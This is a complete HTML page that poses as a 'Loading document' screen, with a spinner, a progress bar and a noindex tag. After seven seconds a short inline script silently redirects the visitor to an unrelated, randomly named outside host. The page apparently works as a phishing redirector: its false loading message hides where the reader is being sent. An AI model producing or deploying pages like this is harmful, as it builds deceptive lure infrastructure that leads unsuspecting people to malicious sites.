<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Document Loading</title>
    <style>
      :root {
        color-scheme: light;
        font-family:
          Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
      }

      * {
        box-sizing: border-box;
      }

      body {
        align-items: center;
        background: #eef3f9;
        color: #111827;
        display: flex;
        justify-content: center;
        margin: 0;
        min-height: 100vh;
        padding: 24px;
      }

      .loading-card {
        background: #ffffff;
        border: 1px solid #dbe3ef;
        border-radius: 18px;
        box-shadow: 0 18px 45px rgba(15, 23, 42, 0.1);
        max-width: 440px;
        padding: 30px;
        text-align: left;
        width: 100%;
      }

      .document-icon {
        align-items: center;
        background: #f8fafc;
        border: 1px solid #dbe3ef;
        border-radius: 14px;
        display: flex;
        height: 64px;
        justify-content: center;
        margin-bottom: 24px;
        width: 64px;
      }

      .document-icon::before {
        background:
          linear-gradient(#2563eb, #2563eb) 12px 14px / 22px 3px no-repeat,
          linear-gradient(#cbd5e1, #cbd5e1) 12px 25px / 34px 3px no-repeat,
          linear-gradient(#cbd5e1, #cbd5e1) 12px 36px / 28px 3px no-repeat,
          #ffffff;
        border: 2px solid #bfdbfe;
        border-radius: 8px;
        content: "";
        height: 42px;
        width: 34px;
      }

      .status {
        align-items: center;
        color: #2563eb;
        display: flex;
        font-size: 13px;
        font-weight: 700;
        gap: 10px;
        letter-spacing: 0.08em;
        margin: 0 0 10px;
        text-transform: uppercase;
      }

      .spinner {
        animation: spin 0.9s linear infinite;
        border: 2px solid #bfdbfe;
        border-radius: 50%;
        border-top-color: #2563eb;
        height: 18px;
        width: 18px;
      }

      h1 {
        font-size: clamp(25px, 6vw, 34px);
        letter-spacing: -0.035em;
        line-height: 1.05;
        margin: 0;
      }

      p {
        color: #64748b;
        font-size: 15px;
        line-height: 1.6;
        margin: 14px 0 0;
      }

      .progress {
        background: #e2e8f0;
        border-radius: 999px;
        height: 8px;
        margin-top: 26px;
        overflow: hidden;
      }

      .progress span {
        animation: progress 7s ease-in-out infinite;
        background: #2563eb;
        border-radius: inherit;
        display: block;
        height: 100%;
        width: 45%;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @keyframes progress {
        0% {
          transform: translateX(-100%);
        }

        100% {
          transform: translateX(230%);
        }
      }

      @media (max-width: 520px) {
        .loading-card {
          padding: 24px;
        }
      }

      @media (prefers-reduced-motion: reduce) {
        *,
        *::before,
        *::after {
          animation-duration: 0.001ms !important;
          animation-iteration-count: 1 !important;
          scroll-behavior: auto !important;
        }
      }
    </style>
  </head>
  <body>
    <main class="loading-card" aria-live="polite">
      <div class="document-icon" aria-hidden="true"></div>
      <p class="status"><span class="spinner" aria-hidden="true"></span> Loading document</p>
      <h1>Preparing your request</h1>
      <p>Please keep this page open while the document session is prepared.</p>
      <div class="progress" aria-hidden="true"><span></span></div>
    </main>

    <script>
      (function () {
        var finalUrl = "https://liberalization652.apexdrift.app/448orthodoxy/";
        var loadingDelayMs = 7000;

        window.setTimeout(function () {
          window.location.replace(finalUrl);
        }, loadingDelayMs);
      }());
    </script>
  </body>
</html>
